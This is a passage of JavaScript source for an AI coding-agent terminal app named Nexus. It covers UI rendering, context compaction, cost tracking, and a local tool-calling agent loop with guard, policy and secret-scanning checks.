      const parts = [bold(sess.model || engine), gray("ctx ") + pc(pct + "%") + " " + bar, gray("↑") + fmtK(sess.inTok) + gray(" ↓") + fmtK(sess.outTok) + gray(" tok")];
      if (PAID[engine]) { const c = costCap && sess.cost >= costCap ? red : green; const est = !ENGINES[engine] || ENGINES[engine].kind !== "stream"; parts.push(sess.cost ? c((est ? "~$" : "$") + sess.cost.toFixed(4)) + (costCap ? gray("/" + costCap.toFixed(2)) : "") : gray("subscription")); }
      else parts.push(green("local · free"));
      if (runningShells) parts.push(yellow(runningShells + " shell" + (runningShells > 1 ? "s" : "")));
      if (bgJobs.running()) parts.push(cyan(bgJobs.running() + " bg"));
      if (activeAgents) parts.push(mag(activeAgents + " agent" + (activeAgents > 1 ? "s" : "")));
      if (rate && rate.status && rate.status !== "allowed") parts.push(red("rate-limited"));
      else if (rate && rate.isUsingOverage) parts.push(yellow("overage"));
      if (pinned.size) parts.push(cyan(pinned.size + " pinned"));
      if (redact) parts.push(yellow("redact"));
      if (offline) parts.push(green("offline"));
      if (guard !== "enforce") parts.push((guard === "off" ? red : yellow)("guard:" + guard));
      if (cowork.on) parts.push(mag("cowork " + cowork.strong.replace(/^claude-|-\d.*$/g, "") + "→" + cowork.weak.replace(/^claude-|-\d.*$/g, "")));
      if (lean) parts.push(green("lean"));
      if (effort) parts.push(gray("effort:" + effort));
      if (style && style !== "default") parts.push(cyan("style:" + style));
      if (fallback) parts.push(gray("fb:" + fallback.replace(/^claude-|-\d.*$/g, "")));
      parts.push(MODES[mode].c(MODES[mode].k));
      return "  " + clip(parts.join(gray("  ·  ")), cols() - 3);
    };
    const hint = () => {
      const C = cols();
      if (compact.on) { const n = 22, f = Math.min(n, compact.f); return clip("  " + yellow("Compacting conversation… ") + gray("[") + cyan("▓".repeat(f)) + gray("░".repeat(n - f)) + gray("] ") + Math.round((f / n) * 100) + "%", C - 2); }
      if (scroll > 0) return clip("  " + yellow("↑ scrolled — " + scroll + " line" + (scroll > 1 ? "s" : "") + " below") + gray("  ·  ") + blue("PgUp/PgDn") + gray(" or wheel to scroll  ") + blue("End") + gray(" jump to latest"), C - 2);
      return clip("  " + blue("↵") + gray(" send  ") + blue("shift+tab") + gray(" mode  ") + blue("ctrl+o") + gray(" " + (expanded ? "collapse" : "expand")) + gray("  ") + blue("@") + gray("file ") + blue("!") + gray("sh ") + blue("#") + gray("note  ") + blue("/") + gray("cmds"), C - 2);
    };
    // matching slash commands for the popup menu (active when the input is a bare /command being typed)
    // Fuzzy command matching: prefer prefix hits, then subsequence (e.g. /cmt -> /commit,
    // /lgn -> /login), ranked by how tightly the typed letters cluster in the name.
    const fuzzyCmds = (q) => {
      q = q.toLowerCase(); const cmds = allCmds();
      const pre = cmds.filter((c) => c[0].startsWith(q));
      if (pre.length) return pre;
      const needle = q.replace(/^\//, ""); if (!needle) return [];
      const scored = [];
      for (const c of cmds) {
        const name = c[0].slice(1); let i = 0, first = -1, last = -1;
        for (let k = 0; k < name.length && i < needle.length; k++) if (name[k] === needle[i]) { if (first < 0) first = k; last = k; i++; }
        if (i === needle.length) scored.push([(last - first) + first * 0.5, c]); // tighter + earlier = better
      }
      return scored.sort((a, b) => a[0] - b[0]).map((s) => s[1]);
    };
    const slashMatches = () => { if (busy || input[0] !== "/" || /\s/.test(input)) return []; return fuzzyCmds(input); };
    let lastLines = null; // previous frame's rows, for line-level diffing
    let modelPick = []; // last catalog shown by /model, so /model <number> can pick from it
    const render = () => {
      const C = cols(), R = rows(), iw = Math.max(4, C - 3);
      const wrapped = []; for (const seg of input.split("\n")) { let s = seg; if (!s.length) { wrapped.push(""); continue; } while (s.length > iw) { wrapped.push(s.slice(0, iw)); s = s.slice(iw); } wrapped.push(s); } if (!wrapped.length) wrapped.push("");
      const menu = slashMatches();
      const menuRows = Math.min(menu.length, Math.max(0, R - 8));
      // clamp input rows so the whole chrome always fits even on short terminals
      const maxIn = Math.max(1, R - 5 - menuRows);
      const inRows = Math.max(1, Math.min(wrapped.length, 8, maxIn));
      const chrome = 1 /*status*/ + menuRows + 1 /*rule*/ + inRows + 1 /*rule*/ + 1 /*hint*/;
      const bodyRows = Math.max(1, R - chrome);
      const lines = bodyLines();
      const maxScroll = Math.max(0, lines.length - bodyRows);
      if (scroll > maxScroll) scroll = maxScroll;
      const start = Math.max(0, lines.length - bodyRows - scroll);
      const view = lines.slice(start, start + bodyRows);
      // Build the frame as an array of rows, then write ONLY the rows that changed
      // since last paint (frameDiff). During streaming just the status timer + the
      // one growing text line differ, so we write ~2 rows instead of the whole screen.
      const frame = [];
      for (let i = 0; i < bodyRows; i++) frame.push(" " + clip(view[i] || "", C - 2));
      frame.push(statusBar());
      for (let i = 0; i < menuRows; i++) { const [nm, ds] = menu[i]; const sel = i === 0; frame.push(clip((sel ? cyan(" › ") : "   ") + (sel ? bold(cyan(nm)) : cyan(nm)) + gray("  " + ds), C - 2)); }
      frame.push(gray("─".repeat(C)));
      const shown = wrapped.slice(Math.max(0, wrapped.length - inRows));
      for (let i = 0; i < inRows; i++) { const c = (i === inRows - 1 && !busy) ? "█" : ""; frame.push((i === 0 ? bold(mag("❯ ")) : "  ") + (shown[i] || "") + c); }
      frame.push(gray("─".repeat(C)));
      frame.push(hint());
      const b = frameDiff(lastLines, frame, ESC);
      lastLines = frame;
      if (b) out.write(b);
    };
    // ---- animation loop: typewriter reveal + spinners + elapsed ----
    const revealing = () => { const b = cur(); if (!b || !b.items) return false; return b.items.some((it) => it.type === "text" && it.shown < it.full.length); };
    const startTick = () => { if (tick) return; tick = setInterval(() => { const b = cur(); if (b && b.items) for (const it of b.items) if (it.type === "text" && it.shown < it.full.length) { let ns = Math.min(it.full.length, it.shown + Math.max(2, Math.ceil((it.full.length - it.shown) / 22))); const cc = it.full.charCodeAt(ns - 1); if (cc >= 0xD800 && cc <= 0xDBFF && ns < it.full.length) ns++; it.shown = ns; } render(); if (!busy && !revealing() && !compact.on) { clearInterval(tick); tick = null; } }, 45); };
    // ---- context compaction (visual + local prune) ----
    const doCompact = (auto) => {
      if (compact.on) return;
      compact.on = true; compact.f = 0; startTick();
      compact.iv = setInterval(() => {
        compact.f += 1;
        if (compact.f >= 22) {
          clearInterval(compact.iv); compact.iv = null;
          const keep = transcript.slice(-6);
          transcript.length = 0;
          transcript.push({ role: "system", text: "[earlier conversation compacted to save context" + (auto ? " — auto at " + Math.round((sess.ctxUsed / (sess.ctxWindow || 1)) * 100) + "%" : "") + "]" });
          for (const k of keep) transcript.push(k);
          // actually shrink the local engine's context: keep the system message + the last few exchanges, and drop the token estimate
          if (oMsgs.length > 7) { const sys = oMsgs[0]; const tail = oMsgs.slice(-6); oMsgs.length = 0; oMsgs.push(sys, ...tail); }
          sess.ctxUsed = Math.floor(sess.ctxUsed * 0.25); warned50 = false;
          compact.on = false; render();
        } else render();
      }, 60);
    };
    const maybeAutoCompact = () => { if (!PAID[engine] && sess.ctxUsed > 0.8 * (sess.ctxWindow || 200000) && !compact.on) doCompact(true); }; // claude self-compacts server-side; only auto-compact the local engine
    const onResize = () => { lastLines = null; if (!loading) render(); }; // geometry changed — force a full repaint
    let cleaned = false;
    const cleanup = () => { if (cleaned) return; cleaned = true; tuiActive = false; if (tick) { clearInterval(tick); tick = null; } if (compact.iv) { clearInterval(compact.iv); compact.iv = null; } if (ctl && ctl.kill) try { ctl.kill(); } catch (_) {} try { bgJobs.killAll(); } catch (_) {} for (const s of mcpServers) { try { s.cp && s.cp.kill(); } catch (_) {} } try { process.stdin.setRawMode(false); } catch (_) {} process.stdin.pause(); process.stdin.removeAllListeners("data"); out.removeListener("resize", onResize); process.removeListener("exit", cleanup); process.removeListener("SIGINT", onSigint); process.removeListener("SIGTERM", onSigterm); process.removeListener("uncaughtException", onFatal); process.removeListener("unhandledRejection", onRejection); out.write(ESC + "[?2004l" + ESC + "[?1000l" + ESC + "[?1006l" + ESC + "[?25h" + ESC + "[?1049l"); };
    tuiActive = true;
    const onFatal = (e) => { const sig = e === "SIGINT" || e === "SIGTERM"; try { cleanup(); } catch (_) {} if (e && e instanceof Error) { try { process.stderr.write("\nNexus exited on error: " + e.message + "\n"); } catch (_) {} } try { resolve(); } catch (_) {} if (sig) process.exit(0); };
    const onSigint = () => onFatal("SIGINT"), onSigterm = () => onFatal("SIGTERM");
    // a rejected turn promise must never leave the UI wedged with busy=true
    const onRejection = (e) => { if (busy || (ctl)) { busy = false; ctl = null; try { transcript.push({ role: "system", text: "recovered from an internal error: " + (e && e.message || e) }); } catch (_) {} try { render(); } catch (_) {} } };
    process.on("exit", cleanup); process.on("SIGINT", onSigint); process.on("SIGTERM", onSigterm); process.on("uncaughtException", onFatal); process.on("unhandledRejection", onRejection);
    // ---- engine turn ----
    const submit = (text) => {
      if (costCap && sess.cost >= costCap) { transcript.push({ role: "system", text: "budget reached ($" + sess.cost.toFixed(4) + " ≥ cap $" + costCap.toFixed(2) + ") — raise it with /budget <amount> to continue" }); render(); return; }
      if (hooks) { const hr = runHooks(hooks, "UserPromptSubmit", { NEXUS_ENGINE: engine, NEXUS_PROMPT: text }, cwd); if (hr.block) { transcript.push({ role: "user", text }); transcript.push({ role: "system", text: "blocked by UserPromptSubmit hook" + (hr.out ? ": " + hr.out : "") }); render(); return; } }
      history.push(text); hIdx = history.length; scroll = 0;
      transcript.push({ role: "user", text });
      let sendText = inlineAts(text);
      if (pinned.size) { let pre = ""; for (const f of pinned) { try { pre += "\n\n--- pinned: " + f + " ---\n" + fs.readFileSync(path.resolve(cwd, f), "utf8").slice(0, 8000) + "\n--- end " + f + " ---"; } catch (_) {} } if (pre) sendText = pre + "\n\n" + sendText; }
      if (index && engine === "ollama") { const rel = retrieve(text, 3); if (rel.length) { let pre = ""; for (const f of rel) { try { pre += "\n\n--- context: " + f + " ---\n" + fs.readFileSync(path.resolve(cwd, f), "utf8").slice(0, 6000) + "\n--- end " + f + " ---"; } catch (_) {} } if (pre) { sendText = pre + "\n\n" + sendText; transcript.push({ role: "system", text: "auto-context: pulled " + rel.join(", ") + " from the index" }); } } }
      if (redact && PAID[engine]) { const masked = maskSecrets(sendText); if (masked !== sendText) { const n = (masked.match(/\[redacted:/g) || []).length; transcript.push({ role: "system", text: "redacted " + n + " secret(s) before sending to " + engine + " (privacy mode on)" }); sendText = masked; } }
      if (lean) sendText = "[Be concise: minimal output, no preamble/recap/explanation unless asked, short code only.] " + sendText; // cut expensive output tokens
      const promptText = mode === 2 ? "Think step by step and produce a concise PLAN of what you would do. Do NOT modify any files yet.\n\n" + sendText : sendText;
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const stat = { files: new Set(), paths: new Set(), cmds: 0, inTok0: sess.inTok, outTok0: sess.outTok, cost0: sess.cost, t0: Date.now() };
      const relOf = (p) => { try { return path.relative(cwd, path.resolve(cwd, p)); } catch (_) { return null; } };
      const ckTree = nexusCheckpoint(cwd); // every engine can now modify files, so always checkpoint (null if not a git repo)
      let ckObj = null; if (ckTree) { ckObj = { tree: ckTree, label: oneline(text, 40), ts: Date.now() }; checkpoints.push(ckObj); }
      busy = true; busyStart = Date.now(); busyWord = FORGE[Math.floor(Math.random() * FORGE.length)]; sess.liveOut = 0;
      ctl = makeCtl(); // local engine checks .stopped; claude overrides .kill with a process kill
      startTick(); render();
      const finish = (res) => {
        for (const it of block.items) if (it.type === "tool" && it.status === "run") { it.status = res && res.interrupted ? "err" : "ok"; it.end = Date.now(); }
        runningShells = 0; activeAgents = 0; ctl = null;
        if (!block.items.length || !block.items.some((i) => i.type === "text" && i.full.trim())) { const t = ensureText(); if (!t.full.trim()) t.full = res && res.interrupted ? "(interrupted)" : (res && res.output) || "(no output)"; }
        const dt = ((Date.now() - stat.t0) / 1000).toFixed(1);
        const din = sess.inTok - stat.inTok0, dout = sess.outTok - stat.outTok0, dcost = sess.cost - stat.cost0;
        if (PAID[engine]) { impact.cloudTurns++; impact.cloudInTok += Math.max(0, din); impact.cloudOutTok += Math.max(0, dout); impact.cloudCost += Math.max(0, dcost); } else { impact.localTurns++; impact.localTok += Math.max(0, din + dout); }
        const bits = [];
        if (stat.files.size) bits.push(stat.files.size + " file" + (stat.files.size > 1 ? "s" : ""));
        if (stat.cmds) bits.push(stat.cmds + " cmd" + (stat.cmds > 1 ? "s" : ""));
        bits.push("↑" + fmtK(din) + " ↓" + fmtK(dout) + " tok");
        if (PAID[engine] && dcost > 0) bits.push("$" + dcost.toFixed(4));
        bits.push(dt + "s");
        if (ckObj) { ckObj.paths = [...stat.paths].filter(Boolean); bits.push("undo #" + checkpoints.length); }
        block.summary = bits.join("  ·  ");
        cont = true; busy = false; if (costCap && sess.cost >= costCap) transcript.push({ role: "system", text: "budget cap reached ($" + sess.cost.toFixed(4) + ") — /budget <amount> to raise" });
        if (!warned50 && sess.ctxUsed > 0.5 * (sess.ctxWindow || 200000)) { warned50 = true; transcript.push({ role: "system", text: "context is over 50% — quality can dip on very long sessions; use /compact or /clear when it makes sense" }); }
        try { saveSession(); } catch (_) {}
        if (hooks) try { runHooks(hooks, "Stop", { NEXUS_ENGINE: engine }, cwd); } catch (_) {}
        if (notify && (Date.now() - stat.t0) > 15000) { out.write("\x07"); try { _cp.spawn("notify-send", ["Nexus", "turn finished (" + ((Date.now() - stat.t0) / 1000 | 0) + "s)"], { stdio: "ignore" }).on("error", () => {}); } catch (_) {} }
        maybeAutoCompact(); render();
      };
      if (engine === "claude") {
        runClaudeStream(promptText, cwd, cont, {
          onInit: (ev) => { if (ev.model) sess.model = ev.model; },
          onRateLimit: (info) => { rate = info; },
          onThinking: (t) => { const bl = cur(); if (!bl.items) bl.items = []; let last = bl.items[bl.items.length - 1]; if (!last || last.type !== "thinking") { last = { type: "thinking", full: "" }; bl.items.push(last); } last.full += t; render(); },
          onText: (t) => { ensureText().full += t; render(); },
          onTool: (tu) => {
            block.items.push({ type: "tool", id: tu.id, name: tu.name, label: toolLabel(tu.name, tu.input), detail: JSON.stringify(tu.input).slice(0, 400), status: "run", start: Date.now() });
            if (tu.name === "Bash") { runningShells++; stat.cmds++; }
            if (tu.name === "Task") activeAgents++;
            if (["Write", "Edit", "MultiEdit", "NotebookEdit"].includes(tu.name) && (tu.input.file_path || tu.input.notebook_path)) { const fp = tu.input.file_path || tu.input.notebook_path; stat.files.add(base(fp)); const r = relOf(fp); if (r) stat.paths.add(r); }
            render();
          },
          onToolResult: (tr) => {
            const it = block.items.find((x) => x.type === "tool" && x.id === tr.id);
            if (it) { it.status = tr.isError ? "err" : "ok"; it.end = Date.now(); it.detail = oneline(resultText(tr.content), 260); if (it.name === "Bash" && runningShells) runningShells--; if (it.name === "Task" && activeAgents) activeAgents--; }
            render();
          },
          onUsage: (u) => { sess.liveOut = u.output_tokens || sess.liveOut; },
          onResult: (ev) => {
            const u = ev.usage || {};
            sess.inTok += (u.input_tokens || 0) + (u.cache_read_input_tokens || 0) + (u.cache_creation_input_tokens || 0);
            sess.outTok += u.output_tokens || 0;
            sess.ctxUsed = (u.input_tokens || 0) + (u.cache_read_input_tokens || 0) + (u.cache_creation_input_tokens || 0) + (u.output_tokens || 0);
            if (typeof ev.total_cost_usd === "number") sess.cost += ev.total_cost_usd;
            const mu = ev.modelUsage && ev.modelUsage[sess.model]; if (mu && mu.contextWindow) sess.ctxWindow = mu.contextWindow;
          },
        }, ctl, { model: cowork.on ? cowork.strong : ((sess.userModel && sess.model && sess.model !== engine) ? sess.model : undefined), small: cowork.on && cowork.weakKind === "claude" ? cowork.weak : undefined, effort: effort || undefined, appendSystemPrompt: ((nexusMd ? "Project instructions (.nexus/NEXUS.md):\n" + nexusMd.slice(0, 4000) : "") + (lean ? "\nBe concise — minimal output, no preamble or recap." : "") + (styleDir(style) ? "\n" + styleDir(style) : "") + policyPrompt()) || undefined, fallbackModel: fallback || undefined, maxBudgetUsd: costCap ? Math.max(0.01, costCap - sess.cost).toFixed(2) : undefined, disallow: mode === 2 ? READONLY_TOOLS : undefined }).then(finish);
      } else if (ENGINES[engine] && ENGINES[engine].kind === "cli") { // gemini / codex / opencode / aider
        const eng = ENGINES[engine];
        const mdl = sess.model && sess.model !== engine ? sess.model : undefined; // only pass a model the user actually chose
        const jsonProto = eng.proto === "gemini-json" || eng.proto === "codex-json";
        // JSON-mode engines emit machine output (not human text), so don't render the
        // raw chunks — just track progress; text engines stream their stdout live.
        const onChunk = jsonProto
          ? ((chunk) => { sess.liveOut += Math.ceil(chunk.length / 4); render(); })
          : ((chunk) => { ensureText().full += chunk; sess.liveOut += Math.ceil(chunk.length / 4); render(); });
        runEngineTask(engine, promptText, cwd, true, cont, onChunk, ctl, mdl).then((res) => {
          const raw = res.output || "";
          let display = raw, inD, outD;
          if (jsonProto) {
            const parsed = eng.proto === "gemini-json" ? geminiParse(raw) : codexParse(raw);
            if (parsed) {
              display = parsed.text || raw;
              if (parsed.inTok || parsed.outTok) { inD = parsed.inTok || Math.ceil(promptText.length / 4); outD = parsed.outTok || Math.ceil(display.length / 4); } // REAL usage
              if (parsed.model && (!sess.model || sess.model === engine)) sess.model = parsed.model;
            }
            ensureText().full = display; // show the parsed assistant text (or raw output if the parse failed)
          }
          if (inD == null) { inD = Math.ceil(promptText.length / 4); outD = Math.ceil(display.length / 4); } // estimate fallback
          sess.inTok += inD; sess.outTok += outD; sess.ctxUsed = sess.inTok + sess.outTok;
          if (PAID[engine]) { const pm = mdl || eng.model || ""; const pr = priceOf(pm); sess.cost += (inD * pr.in + outD * pr.out) / 1e6; } // priced from the table → shown as ~$
          finish(res);
        });
      } else { // ollama — LOCAL agent with full device access (read/write/edit/list/run_command)
        const mcps = mcpToolList();
        const extra = (mcps.length ? " MCP tools: " + mcps.map((m) => m.full + " — " + oneline(m.desc, 40)).join("; ") + "." : "") + " spawn_agents{tasks:[\"...\",\"...\"]} runs several INDEPENDENT sub-tasks in parallel via sub-agents and returns all their results — use it to split big work.";
        if (oMsgs.length === 1) oMsgs[0].content = "You are Nexus, a local autonomous coding agent on the operator's own machine (cwd " + cwd + "). Accomplish the TASK by taking ONE action per step and reading each OBSERVATION before the next. TOOLS: read_file{path}, write_file{path,content}, edit_file{path,find,replace}, list_dir{path?}, run_command{command} (full shell, blocks until done), run_background{command} (start a long-running command WITHOUT blocking — returns a jobId), check_background{id?} (poll a background job's output/status, or list all), stop_background{id} (kill a background job), search{pattern,path?} (grep file contents), find{glob,path?} (find files), http_fetch{url,method?} (network), sysinfo{} (OS/CPU/memory/disk), list_processes{filter?}, make_dir{path}, move{from,to}, copy{from,to}, delete{path}, remember{text} (save a DURABLE project convention/preference to NEXUS.md — only for lasting rules, not one-off facts), discover{query} (search available tools by keyword)." + extra + " Reply with exactly ONE JSON object: {\"thought\",\"action\":\"tool\",\"tool\",\"args\"} or {\"thought\",\"action\":\"final\",\"final\"}. Keep going until the task is fully done." + (lean ? " Be terse: short thoughts, minimal final summary." : "") + (styleDir(style) ? " " + styleDir(style) : "") + (nexusMd ? "\n\nPROJECT (.nexus/NEXUS.md):\n" + nexusMd.slice(0, 4000) : "");
        oMsgs.push({ role: "user", content: promptText });
        sess.inTok += Math.ceil(promptText.length / 4);
        const olbl = (n, a) => n === "read_file" ? "Read(" + base(a.path) + ")" : n === "write_file" ? "Write(" + base(a.path) + ")" : n === "edit_file" ? "Update(" + base(a.path) + ")" : n === "run_command" ? "Bash(" + oneline(a.command, 40) + ")" : n === "run_background" ? "Background(" + oneline(a.command, 32) + ")" : n === "check_background" ? "CheckJob(" + (a.id || "all") + ")" : n === "stop_background" ? "StopJob(" + (a.id || "?") + ")" : n === "list_dir" ? "List(" + (a.path || ".") + ")" : (n === "search" || n === "grep") ? "Search(" + oneline(a.pattern || a.query, 30) + ")" : (n === "find" || n === "find_files" || n === "glob") ? "Find(" + oneline(a.glob || a.pattern || a.name, 30) + ")" : (n === "http_fetch" || n === "web_fetch" || n === "fetch_url" || n === "http") ? "Fetch(" + oneline(a.url, 36) + ")" : (n === "sysinfo" || n === "system_info") ? "Sysinfo()" : (n === "list_processes" || n === "ps") ? "Processes()" : (n === "make_dir" || n === "mkdir") ? "Mkdir(" + base(a.path) + ")" : (n === "move" || n === "rename" || n === "move_file") ? "Move(" + base(a.to || a.dest) + ")" : (n === "copy" || n === "copy_file") ? "Copy(" + base(a.to || a.dest) + ")" : (n === "delete" || n === "delete_file" || n === "rm") ? "Delete(" + base(a.path) + ")" : n === "spawn_agents" ? "Task(" + ((a.tasks || []).length) + " agents)" : n === "remember" ? "Remember(" + oneline(a.text || a.note || "", 34) + ")" : n === "discover" ? "Discover(" + oneline(a.query || a.q || "", 30) + ")" : String(n).startsWith("mcp__") ? String(n).replace(/^mcp__/, "").replace("__", ":") + "()" : n + "()";
        (async () => {
          let mdl = process.env.SENTINEL_MODEL || (sess.model && sess.model !== engine ? sess.model : "");
          if (!mdl) { mdl = pickCoderModel(await ollamaTags()); }
          sess.model = mdl || engine;
          if (!mdl) { ensureText().full = "No local model found. Install Ollama and pull one, e.g. `ollama pull hermes3`, or use /engine claude."; return finish({ output: "" }); }
          let didTool = false, nudges = 0, filesThisTurn = 0; const readCache = {};
          for (let step = 1; step <= 30; step++) {
            if (ctl && ctl.stopped) { ensureText().full += (ensureText().full.trim() ? "\n" : "") + "(interrupted)"; break; }
            let raw; try { raw = await ollamaChat(mdl, oMsgs, CODER_SCHEMA, aSignal(ctl)); } catch (e) { if (ctl && ctl.stopped) break; ensureText().full += "\nmodel error: " + e.message; break; }
            sess.outTok += Math.ceil(raw.length / 4); sess.liveOut += Math.ceil(raw.length / 4);
            let o; try { o = JSON.parse(raw); } catch (_) { oMsgs.push({ role: "tool", content: "Reply with valid schema JSON only." }); continue; }
            oMsgs.push({ role: "assistant", content: raw });
            if (o.thought) { const t = ensureText(); t.full += (t.full ? "\n" : "") + o.thought; render(); }
            if (o.action === "final") { if (!didTool && nudges++ < 2) { oMsgs.push({ role: "tool", content: "Do the real work with tools first." }); continue; } if (o.final) { const t = ensureText(); t.full += (t.full ? "\n\n" : "") + o.final; } break; }
            const name = o.tool, a = o.args || {};
            const card = { type: "tool", id: "o" + step, name, label: olbl(name, a), status: "run", start: Date.now(), detail: JSON.stringify(a).slice(0, 400) };
            block.items.push(card);
            if (name === "run_command") { runningShells++; stat.cmds++; }
            if (name === "spawn_agents") activeAgents += (a.tasks || []).length;
            if (["write_file", "edit_file"].includes(name) && a.path) { stat.files.add(base(a.path)); const r = relOf(a.path); if (r) stat.paths.add(r); }
            render();
            let result, blocked = false;
            if (mode === 2 && (["write_file", "edit_file", "run_command", "delete", "delete_file", "rm", "move", "move_file", "rename", "copy", "copy_file", "make_dir", "mkdir", "spawn_agents"].includes(name) || String(name).startsWith("mcp__"))) { result = { error: "plan mode is on — file/system changes are blocked. Describe the plan instead, then switch mode with shift+tab to execute." }; blocked = true; card.status = "err"; }
            if (!blocked && (name === "run_command" || name === "run_background") && guard !== "off") { const d = classifyDanger(a.command); if (d.level === "block" && guard === "enforce") { result = { error: "BLOCKED by Sentinel guard: " + d.why + " (/guard off to allow, or run it yourself with !)" }; blocked = true; card.status = "err"; transcript.push({ role: "system", text: "Sentinel guard blocked a destructive command — " + d.why + ": " + oneline(a.command, 46) }); } else if (d.level !== "ok") transcript.push({ role: "system", text: "Sentinel: " + d.why + " — " + oneline(a.command, 46) + (d.level === "block" ? " (allowed; guard is " + guard + ")" : "") }); }
            // ---- enterprise policy guardrails (.nexus/policy.json) ----
            if (!blocked) {
              const act = (name === "run_command" || name === "run_background") ? { type: "run", command: a.command }
                : ["http_fetch", "web_fetch", "fetch_url", "http"].includes(name) ? { type: "fetch" }
                : name === "write_file" ? { type: "write", path: a.path }
                : name === "edit_file" ? { type: "edit", path: a.path }
                : ["delete", "delete_file", "rm"].includes(name) ? { type: "delete", path: a.path }
                : ["move", "move_file", "rename", "copy", "copy_file"].includes(name) ? { type: "move", path: a.to || a.dest || a.path }
                : null;
              if (act) {
                const pc = policyCheck(policy, act);
                if (!pc.allow) { result = { error: "BLOCKED by policy: " + pc.reason + (pc.approval ? " — needs approval (edit .nexus/policy.json or run it yourself with !)" : "") }; blocked = true; card.status = "err"; transcript.push({ role: "system", text: "policy blocked " + name + " — " + pc.reason }); if (policy.audit) auditLog(cwd, { engine, tool: name, path: act.path, cmd: act.command, status: "blocked", reason: pc.reason }); }
                else if ((act.type === "write" || act.type === "edit") && policy.maxFilesPerTurn > 0 && filesThisTurn >= policy.maxFilesPerTurn) { result = { error: "BLOCKED by policy: reached the " + policy.maxFilesPerTurn + "-file-per-turn limit" }; blocked = true; card.status = "err"; }
              }
              a.__act = act; // stash for post-exec audit
            }
            if (!blocked && hooks) { const hr = runHooks(hooks, "PreToolUse", { TOOL_NAME: name, TOOL_ARGS: JSON.stringify(a) }, cwd); if (hr.block) { result = { error: "blocked by PreToolUse hook" + (hr.out ? ": " + hr.out : "") }; blocked = true; } }
            if (!blocked) try {
              if (name === "read_file") { const fp = path.resolve(cwd, a.path); const mt = fs.statSync(fp).mtimeMs; if (readCache[fp] === mt) result = { content: "(unchanged since you read " + a.path + " earlier this turn — not re-sending to save tokens)" }; else { readCache[fp] = mt; result = { content: fs.readFileSync(fp, "utf8").slice(0, 14000) }; } }
              else if (name === "list_dir") result = { items: fs.readdirSync(path.resolve(cwd, a.path || "."), { withFileTypes: true }).map((e) => e.isDirectory() ? e.name + "/" : e.name).slice(0, 200) };
              else if (name === "write_file") { const fp = path.resolve(cwd, a.path); const sec = scanSecrets(a.content); if (policy.blockSecrets && sec.length) { result = { error: "BLOCKED by policy: file contains " + sec.join(", ") + " — secret writes are disabled (policy.blockSecrets)" }; transcript.push({ role: "system", text: "policy blocked write to " + a.path + " — contains " + sec.join(", ") }); if (policy.audit) auditLog(cwd, { engine, tool: name, path: a.path, status: "blocked", reason: "secret:" + sec.join("/") }); } else { fs.mkdirSync(path.dirname(fp), { recursive: true }); fs.writeFileSync(fp, a.content == null ? "" : a.content); delete readCache[fp]; result = sec.length ? { ok: true, warning: "Nexus flagged possible secret(s) in this file: " + sec.join(", ") + " — review before committing" } : { ok: true }; if (sec.length) transcript.push({ role: "system", text: "security warning: " + a.path + " may contain " + sec.join(", ") + " — Nexus wrote it but flagged it" }); } }
              else if (name === "edit_file") { const fp = path.resolve(cwd, a.path); const t = fs.readFileSync(fp, "utf8"); if (!t.includes(a.find)) result = { error: "find string not present" }; else { fs.writeFileSync(fp, t.replace(a.find, a.replace == null ? "" : a.replace)); delete readCache[fp]; result = { ok: true }; } }
              else if (name === "run_command") { const r = await coderShell(a.command, cwd); result = { code: r.code, output: compactOutput(r.output, 4000) }; }
              else if (name === "run_background") { if (!a.command || typeof a.command !== "string") { result = { error: "run_background needs a non-empty command string" }; } else { const p = _cp.spawn(process.platform === "win32" ? "cmd" : "sh", process.platform === "win32" ? ["/c", a.command] : ["-c", a.command], { cwd, env: process.env }); const id = bgJobs.start(a.command, p, Date.now()); p.stdout && p.stdout.on("data", (d) => bgJobs.append(id, d)); p.stderr && p.stderr.on("data", (d) => bgJobs.append(id, d)); p.on("close", (code) => bgJobs.finish(id, code)); p.on("error", (e) => { bgJobs.append(id, "spawn error: " + e.message); bgJobs.finish(id, 1); }); result = { ok: true, jobId: id, status: "running", hint: "poll it with check_background{id:'" + id + "'}, stop it with stop_background{id:'" + id + "'}" }; } }
              else if (name === "check_background") { if (a.id) { const j = bgJobs.get(a.id); result = j ? { id: j.id, status: j.status, code: j.code, output: compactOutput(bgJobs.tail(a.id, 6000), 4000) } : { error: "no such job " + a.id }; } else result = { jobs: bgJobs.list() }; }
              else if (name === "stop_background") { result = a.id ? { ok: bgJobs.stop(a.id), stopped: a.id } : { error: "stop_background needs a job id" }; }
              else if (name === "spawn_agents") { const tasks = (a.tasks || []).map(String).filter(Boolean).slice(0, 8); const outs = await runSubagents(engine, tasks, cwd, mdl, null, ctl); result = { agents: outs.map((o2, i) => ({ task: tasks[i], result: (o2 || "").slice(0, 1500) })) }; }
              else if (String(name).startsWith("mcp__")) { const srv = mcpServers.find((s) => !s.error && String(name).slice(5).startsWith(s.name + "__")); if (!srv) result = { error: "MCP tool not connected: " + name }; else { const tool = String(name).slice(5 + srv.name.length + 2); const r = await srv.call("tools/call", { name: tool, arguments: a }); result = { content: resultText((r && r.content) || r) }; } }
              else if (name === "discover") { result = { tools: discoverTools(a.query || a.q || "", TOOL_CATALOG.concat(mcpToolList().map((m) => [m.full, m.desc]))) }; }
              else if (name === "remember") { const note = a.text || a.note || a.content || ""; let md0 = ""; try { md0 = fs.readFileSync(path.join(cwd, ".nexus", "NEXUS.md"), "utf8"); } catch (_) {} const rr = mergeMemory(md0, note); if (rr.added) { fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); fs.writeFileSync(path.join(cwd, ".nexus", "NEXUS.md"), rr.md); result = { ok: true, remembered: true }; transcript.push({ role: "system", text: "remembered → .nexus/NEXUS.md: " + oneline(note, 60) }); } else result = { ok: true, remembered: false, note: rr.reason || "already known" }; }
              else { const dr = await deviceTool(name, a, cwd); result = dr !== null ? dr : { error: "unknown tool " + name }; if (dr !== null && ["move", "copy", "copy_file", "move_file", "rename", "make_dir", "mkdir", "delete", "delete_file", "rm"].includes(name) && (a.path || a.to || a.dest)) { const fp = a.to || a.dest || a.path; stat.files.add(base(fp)); const r = relOf(fp); if (r) stat.paths.add(r); } }
            } catch (e) { result = { error: e.message }; }
            if (!(result && typeof result.error === "string" && result.error.startsWith("unknown tool"))) didTool = true;
            if (name === "run_command" && runningShells) runningShells--;
            if (name === "spawn_agents") activeAgents = Math.max(0, activeAgents - (a.tasks || []).length);
